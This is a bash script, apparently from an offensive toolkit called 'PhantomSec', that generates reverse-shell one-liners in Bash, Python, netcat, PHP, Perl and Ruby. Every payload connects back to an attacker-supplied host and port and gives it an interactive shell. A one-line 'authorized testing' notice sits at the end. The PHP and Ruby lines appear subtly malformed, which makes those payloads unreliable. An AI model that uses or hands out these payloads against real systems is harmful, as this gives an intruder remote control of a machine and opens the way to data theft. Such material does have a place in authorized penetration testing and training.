#!/usr/bin/env bash
# PhantomSec — Reverse Shell Generator
# Usage: ps-revshell [lhost] [lport]

LHOST="${1:-$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)}"
LPORT="${2:-4444}"

G='\033[0;32m' C='\033[0;36m' NC='\033[0m' B='\033[1m' R='\033[0;31m'

if [ -z "$LHOST" ]; then
  LHOST="$(hostname -I 2>/dev/null | awk '{print $1}')"
fi

echo -e "\n${G}[+] Reverse Shell Generator${NC}"
echo -e "  ${C}LHOST: ${LHOST:-<not detected>} | LPORT: ${LPORT}${NC}\n"

echo -e "${B}  [1] Bash${NC}"
echo "  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"

echo -e "\n${B}  [2] Python${NC}"
echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

echo -e "\n${B}  [3] Netcat${NC}"
echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"

echo -e "\n${B}  [4] PHP${NC}"
echo "  php -r '\$c=new fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo -e "\n${B}  [5] Perl${NC}"
echo "  perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($LPORT,inet_aton(\"$LHOST\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'"

echo -e "\n${B}  [6] Ruby${NC}"
echo "  ruby -rsocket -e 'TCPSocket.new(\"$LHOST\",$LPORT).exec(\"/bin/sh -i\")'"

echo ""
echo -e "${R}  For authorized security testing only.${NC}"
echo ""
